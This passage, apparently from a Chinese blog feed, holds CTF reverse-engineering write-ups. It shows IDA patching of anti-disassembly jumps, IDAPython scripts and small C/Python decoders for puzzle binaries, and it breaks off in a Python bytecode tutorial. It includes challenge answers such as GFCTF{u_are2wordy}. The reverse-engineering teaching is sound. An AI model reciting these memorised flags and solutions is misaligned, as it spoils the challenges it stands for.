class="hljs-built_in">ord</span>(Str1[(i * i + <span class="hljs-number">123</span>) % <span class="hljs-number">21</span>])<br>        <span class="hljs-keyword">while</span> original_val &lt; <span class="hljs-number">32</span>:<br>            original_val += <span class="hljs-number">96</span><br>        Str1[i] = <span class="hljs-built_in">chr</span>(original_val)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(Str1)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    original_str = reverse_transformation()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;原始输入字符串：&quot;</span>, original_str)<br></code></pre></td></tr></table></figure><h2 id="3、wordy"><a href="#3、wordy" class="headerlink" title="3、wordy"></a>3、wordy</h2><p>IDA打开存在大量jmp跳转，导致程序无法正常编译，尝试将跳转nop掉</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721359662160-54d1ff47-1314-4eaa-af43-2f0f8ded77cd.png"></p><p>shift+F2添加exp</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721359798003-c8edb38f-e2a8-4d14-8241-d040fac187fd.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 利用idapython脚本解决重复工作</span><br><span class="hljs-attribute">startaddr</span> = <span class="hljs-number">0</span>x1135<br><span class="hljs-attribute">endaddr</span> = <span class="hljs-number">0</span>x3100<br><br><span class="hljs-attribute">for</span> i in range(startaddr,endaddr):<br>    <span class="hljs-attribute">if</span> get_wide_byte(i) == <span class="hljs-number">0</span>xEB:<br>        <span class="hljs-attribute">if</span> get_wide_byte(i+<span class="hljs-number">1</span>) == <span class="hljs-number">0</span>xFF:<br>            <span class="hljs-attribute">patch_byte</span>(i,<span class="hljs-number">0</span>x90)<br>            <span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;[+] Addr &#123;&#125; is patched&quot;</span>.format(hex(i)))<br></code></pre></td></tr></table></figure><p>然后对main P一下，F5编译</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721359814971-53d2e435-aa8f-4ac6-b124-150df674f9ef.png"></p><p>如果没有脚本，建议空格去图里面看比较好</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721359955286-133ae6ef-5ae6-4f83-bc3a-61f7e2b9ba8b.png"></p><p>这里找到flag</p><h3 id="附上大佬脚本"><a href="#附上大佬脚本" class="headerlink" title="附上大佬脚本"></a>附上大佬脚本</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import idc<br>import ida_bytes<br>import ida_ida<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-----&quot;</span>)<br><span class="hljs-attribute">hexStr</span>=<span class="hljs-string">&quot;EB FF C0 BF ?? 00 00 00 E8&quot;</span><br>bMask = bytes.fromhex(hexStr.replace(<span class="hljs-string">&#x27;00&#x27;</span>, <span class="hljs-string">&#x27;01&#x27;</span>).replace(<span class="hljs-string">&#x27;??&#x27;</span>, <span class="hljs-string">&#x27;00&#x27;</span>))<br>bPattern = bytes.fromhex(hexStr.replace(<span class="hljs-string">&#x27;??&#x27;</span>, <span class="hljs-string">&#x27;00&#x27;</span>))<br><span class="hljs-attribute">signs</span>=ida_bytes.BIN_SEARCH_FORWARD| ida_bytes.BIN_SEARCH_NOBREAK| ida_byte<br>s.BIN_SEARCH_NOSHOW<br><span class="hljs-built_in">print</span>(bMask,bPattern)<br><span class="hljs-attribute">begin_addr</span>=0x1135<br><span class="hljs-attribute">end_addr</span>=0x3100<br><span class="hljs-attribute">s</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">while</span> begin_addr&lt;end_addr:<br>    <span class="hljs-attribute">ea</span>=ida_bytes.bin_search(begin_addr,end_addr,bPattern,bMask,1,signs)<br>    <span class="hljs-keyword">if</span> ea == ida_idaapi.BADADDR:<br>        break<br>    <span class="hljs-keyword">else</span>:<br>        s+=chr(idc.get_wide_byte(ea+4))<br>        <span class="hljs-attribute">begin_addr</span>=ea+8<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>打开16进制转存储视图，可以看到flag（hex_dump）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721360264704-c3d44e79-5175-4a8e-b150-d96fc7b54eb7.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721359190406-429ef909-dda6-4ff2-9d88-25a284922613.png"></p><p>GFCTF{u_are2wordy}</p><h2 id="4、e-sy-flower"><a href="#4、e-sy-flower" class="headerlink" title="4、e@sy_flower"></a>4、e@sy_flower</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721360442073-d4f7bbef-ddee-4624-bd6f-2351ab5e19a8.png"></p><p>放入32位ida</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721360480658-9d95cf9c-4e83-4973-82d7-5d1954e89698.png"></p><p>将E9改成90，保存一下发编译即可</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721362959271-e0d76b72-3677-4e17-b18e-dea313d5288d.png"></p><p>简单逆向一下</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">a</span> = list(<span class="hljs-string">&#x27;c~scvdzKCEoDEZ[^roDICUMC&#x27;</span>)<br><br><span class="hljs-comment"># Step 1: XOR operation with 0x30</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-built_in">len</span>(<span class="hljs-keyword">a</span>)):<br>    <span class="hljs-keyword">a</span>[i] = chr(ord(<span class="hljs-keyword">a</span>[i]) ^ <span class="hljs-number">0x30</span>)<br><br><span class="hljs-comment"># 输出 XOR 处理后的字符串</span><br>print(<span class="hljs-string">&quot;After XOR operation:&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-keyword">a</span>))<br><br><span class="hljs-comment"># Step 2: Swap adjacent characters</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-built_in">len</span>(<span class="hljs-keyword">a</span>)<span class="hljs-comment"> // 2):</span><br>    tmp = <span class="hljs-keyword">a</span>[i * <span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">a</span>[i * <span class="hljs-number">2</span>] = <span class="hljs-keyword">a</span>[i * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">a</span>[i * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] = tmp<br><br><span class="hljs-comment"># 输出交换后的字符串</span><br>print(<span class="hljs-string">&quot;After swapping:&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-keyword">a</span>))<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">a=<span class="hljs-built_in">list</span>(<span class="hljs-string">&#x27;c~scvdzKCEoDEZ[^roDICUMC&#x27;</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[i]</span>=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[i]</span>)^<span class="hljs-number">0</span>x30)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a,end=<span class="hljs-string">&#x27;\n&#x27;</span>)</span></span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)<span class="hljs-comment">//2):</span><br>    tmp=<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[i*2]</span><br>    <span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[i*2]</span>=<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[i*2+1]</span><br>    <span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[i*2+1]</span>=tmp<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&#x27;&#x27;</span>.join(a)</span></span>)<br></code></pre></td></tr></table></figure><h2 id="5、chicken-soup"><a href="#5、chicken-soup" class="headerlink" title="5、chicken_soup"></a>5、chicken_soup</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721372130642-283c8a47-f74e-419a-8a5f-63cbc3a6befb.png"></p><p>放入32位</p><p>看到两个对v4的加密函数</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721372777406-b52a1d8f-eb7d-487a-8f0a-d5a254c5ee58.png"></p><p>跟进去nop一下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721372760398-932abc00-ae72-44ca-974e-27026028e47a.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/42988179/1721372964357-0f2792be-8142-4522-8da8-ca2d56c10451.jpeg"></p><p>按p创建函数，C一下黄色的汇编代码，然后F5反编译</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721372955966-292f70aa-7788-4e37-8fdb-448b34cb5f8c.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721373162284-1d98a015-b513-484a-9ed3-d52c8b050fc4.png"></p><p>找到比较数据源</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721374849174-e01b2c7a-b742-4aa5-9116-fb83bc9ceaca.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721374886691-dd6b1c35-9f76-459e-8531-d1471ab69a8e.png"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">#include&lt;stdio<span class="hljs-number">.</span>h&gt;<br><span class="hljs-keyword">int</span> main()<br>&#123;<br>        unsigned char a1[] =<br>&#123;<br>        <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x7D</span>,<br>        <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xCC</span>,<br>        <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x9D</span>,<br>        <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xD7</span><br>&#125;<span class="hljs-comment">;</span><br>        for (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span><span class="hljs-comment">;i&lt;38;i++ )</span><br>        &#123;<br>                a1[i] = (<span class="hljs-number">16</span> * a1[i]) | (a1[i] &gt;&gt; <span class="hljs-number">4</span>)<span class="hljs-comment">;</span><br>        &#125;<br>        for(<span class="hljs-keyword">int</span> j=<span class="hljs-number">36</span><span class="hljs-comment">;j&gt;0;j--)&#123;</span><br>                a1[j]-=a1[j+<span class="hljs-number">1</span>]<span class="hljs-comment">;</span><br>        &#125;<br>        for(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span><span class="hljs-comment">;i&lt;38;i++)</span><br>        &#123;<br>                printf(<span class="hljs-string">&quot;%c&quot;</span>,a1[i])<span class="hljs-comment">;</span><br>        &#125;<br>        return <span class="hljs-number">0</span><span class="hljs-comment">;</span><br> &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721373728364-cc4c9996-d851-4558-9e48-d105092417cf.png"></p><h1 id="例题ret-call-5"><a href="#例题ret-call-5" class="headerlink" title="例题ret call$5"></a>例题ret call$5</h1><h2 id="dirty-flower"><a href="#dirty-flower" class="headerlink" title="dirty_flower"></a>dirty_flower</h2><p>第一个异常,call $+5,看完以后，发现前面的push eax，，后面的retn, 跟着pop eax，从push eax 到pop eax，直接改成nop ,然后回到上面的main ,用U改成未定义，在用P重新生成就可以了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1728725049411-8a6682df-5600-4cc4-bf9c-cc7a753f6403.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1728725119217-462f7118-0bcd-4bf2-bc52-7902234bd15e.png"></p><p>就可以反编译了，</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1728725130410-d178243e-f9e9-49ab-b740-ba3f3ff21781.png"></p><p>下面这个函数也是一样的，nop后去上面找到该函数，u，p</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1728725165787-5f55b86b-a466-4f52-908e-c35615cb1c28.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1728725243684-adc4b1c5-c0a1-4731-b1e0-9b062f1a23ff.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1728724936661-ce5187ca-c911-49b7-8bff-b440ebc686f2.png">exp</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs prolog">#include&lt;stdio.h&gt;<br>#include&lt;string.h&gt;<br>int main()<br>&#123;<br>    char s[]=<span class="hljs-string">&quot;dirty_flower&quot;</span>;<br>    int v3[<span class="hljs-number">36</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>  v3[<span class="hljs-number">0</span>] = <span class="hljs-number">2</span>;<br>  v3[<span class="hljs-number">1</span>] = <span class="hljs-number">5</span>;<br>  v3[<span class="hljs-number">2</span>] = <span class="hljs-number">19</span>;<br>  v3[<span class="hljs-number">3</span>] = <span class="hljs-number">19</span>;<br>  v3[<span class="hljs-number">4</span>] = <span class="hljs-number">2</span>;<br>  v3[<span class="hljs-number">5</span>] = <span class="hljs-number">30</span>;<br>  v3[<span class="hljs-number">6</span>] = <span class="hljs-number">83</span>;<br>  v3[<span class="hljs-number">7</span>] = <span class="hljs-number">31</span>;<br>  v3[<span class="hljs-number">8</span>] = <span class="hljs-number">92</span>;<br>  v3[<span class="hljs-number">9</span>] = <span class="hljs-number">26</span>;<br>  v3[<span class="hljs-number">10</span>] = <span class="hljs-number">39</span>;<br>  v3[<span class="hljs-number">11</span>] = <span class="hljs-number">67</span>;<br>  v3[<span class="hljs-number">12</span>] = <span class="hljs-number">29</span>;<br>  v3[<span class="hljs-number">13</span>] = <span class="hljs-number">54</span>;<br>  v3[<span class="hljs-number">14</span>] = <span class="hljs-number">67</span>;<br>  v3[<span class="hljs-number">15</span>] = <span class="hljs-number">7</span>;<br>  v3[<span class="hljs-number">16</span>] = <span class="hljs-number">38</span>;<br>  v3[<span class="hljs-number">17</span>] = <span class="hljs-number">45</span>;<br>  v3[<span class="hljs-number">18</span>] = <span class="hljs-number">85</span>;<br>  v3[<span class="hljs-number">19</span>] = <span class="hljs-number">13</span>;<br>  v3[<span class="hljs-number">20</span>] = <span class="hljs-number">3</span>;<br>  v3[<span class="hljs-number">21</span>] = <span class="hljs-number">27</span>;<br>  v3[<span class="hljs-number">22</span>] = <span class="hljs-number">28</span>;<br>  v3[<span class="hljs-number">23</span>] = <span class="hljs-number">45</span>;<br>  v3[<span class="hljs-number">24</span>] = <span class="hljs-number">2</span>;<br>  v3[<span class="hljs-number">25</span>] = <span class="hljs-number">28</span>;<br>  v3[<span class="hljs-number">26</span>] = <span class="hljs-number">28</span>;<br>  v3[<span class="hljs-number">27</span>] = <span class="hljs-number">48</span>;<br>  v3[<span class="hljs-number">28</span>] = <span class="hljs-number">56</span>;<br>  v3[<span class="hljs-number">29</span>] = <span class="hljs-number">50</span>;<br>  v3[<span class="hljs-number">30</span>] = <span class="hljs-number">85</span>;<br>  v3[<span class="hljs-number">31</span>] = <span class="hljs-number">2</span>;<br>  v3[<span class="hljs-number">32</span>] = <span class="hljs-number">27</span>;<br>  v3[<span class="hljs-number">33</span>] = <span class="hljs-number">22</span>;<br>  v3[<span class="hljs-number">34</span>] = <span class="hljs-number">84</span>;<br>  v3[<span class="hljs-number">35</span>] = <span class="hljs-number">15</span>;<br>  int len=strlen(s);<br>  for(int i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">36</span>;i++)<br>  &#123;<br>    v3[i]^=s[i<span class="hljs-comment">%12];</span><br>    printf(<span class="hljs-string">&quot;%c&quot;</span>,v3[i]);<br>  &#125;<br>  return <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>REVERSE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python字节码</title>
    <link href="/2025/03/22/python%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2025/03/22/python%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/nLesxw/p/python_bytecode.html">从一道CTF题学习python字节码到源码逆向 - nLesxw - 博客园</a></p><h1 id="前文"><a href="#前文" class="headerlink" title="前文"></a>前文</h1><p>先了解python的字节码结构，如下：</p><p>源码行号 | 指令在函数中的偏移 | 指令符号 | 指令参数 | 实际参数值</p><p>第一个为源码行号，从上述题目中我们可以了解到，本题只有5行源码，但是只给了从第3行开始的字节码</p><p>第二个指令在函数中的偏移和第四个指令参数对于做题来说不是太过重要，我们在做题的时候主要还是看指令符号和实际参数值</p><p>在第3行的字节码指令符号中，有LOAD_CONST ，BUILD_LIST ，STORE_FAST 三种类型</p><p>LOAD_CONST 加载常量，通常为整数值</p><p>BUILD_LIST 创建一个列表</p><p>STORE_FAST 一般用于保存值到局部变量</p><p>SETUP_LOOP，用于开始循环，括号里的189表示循环退出点（字节码结构中的第二个指令在函数中偏移）</p><p>LOAD_GLOBAL，用来加载全局变量，包括指定函数名，类名，模块名等全局符号</p><p>CALL_FUNCTION，用来表示前面加载全局变量的参数个数</p><p>GET_ITER，FOR_ITER ，获取参数，开始迭代。这两个不需要过多理解，属于for-in结构特有的，它们通常同时出现。</p><p>BINARY_SUBSCR ，读取迭代器中某个下标的值</p><p>BINARY_RSHIFT，进行右移运算</p><p>BINARY_LSHIFT ，左移运算</p><p>BINARY_OR，或运算</p><p>BINARY_AND ，与运算</p><p>STORE_SUBSCR ，修改迭代器中某个下标的值</p><p>JUMP_ABSOLUTE ，回到循环起点</p><p>RETURN_VALUE ，函数结束标志</p><p>POP_BLOCK，特有的，不用特别理解，对转换回源码不重要，通常和LOAD_CONST 0 (None)一起出现。</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><code class="hljs tap">ezRe (Python 3.9)<br>[Code]<br>    File Name: flag_checker.py<br>    Object Name: &lt;module&gt;<br>    Arg Count: 0<br>    Pos Only Arg Count: 0<br>    KW Only Arg Count: 0<br>    Locals: 0<br>    Stack Size: 7<br>    Flags: 0x00000040 (CO_NOFREE)<br>    [Names]<br>        &#x27;base64&#x27;<br>        &#x27;input&#x27;<br>        &#x27;text&#x27;<br>        &#x27;key&#x27;<br>        &#x27;list&#x27;<br>        &#x27;range&#x27;<br>        &#x27;s&#x27;<br>        &#x27;j&#x27;<br>        &#x27;i&#x27;<br>        &#x27;len&#x27;<br>        &#x27;data&#x27;<br>        &#x27;_&#x27;<br>        &#x27;append&#x27;<br>        &#x27;result&#x27;<br>        &#x27;zip&#x27;<br>        &#x27;c&#x27;<br>        &#x27;k&#x27;<br>        &#x27;chr&#x27;<br>        &#x27;ord&#x27;<br>        &#x27;b64encode&#x27;<br>        &#x27;encode&#x27;<br>        &#x27;decode&#x27;<br>        &#x27;enc&#x27;<br>        &#x27;print&#x27;<br>    [Var Names]<br>    [Free Vars]<br>    [Cell Vars]<br>    [Constants]<br>        0<br>        None<br>        &#x27;Flag: &#x27;<br>        &#x27;7e021a7dd49e4bd0837e22129682551b&#x27;<br>        [Code]<br>            File Name: flag_checker.py<br>            Object Name: &lt;listcomp&gt;<br>            Arg Count: 1<br>            Pos Only Arg Count: 0<br>            KW Only Arg Count: 0<br>            Locals: 2<br>            Stack Size: 4<br>            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)<br>            [Names]<br>                &#x27;ord&#x27;<br>            [Var Names]<br>                &#x27;.0&#x27;<br>                &#x27;i&#x27;<br>            [Free Vars]<br>            [Cell Vars]<br>            [Constants]<br>                102<br>            [Disassembly]<br>               <span class="hljs-number"> 0 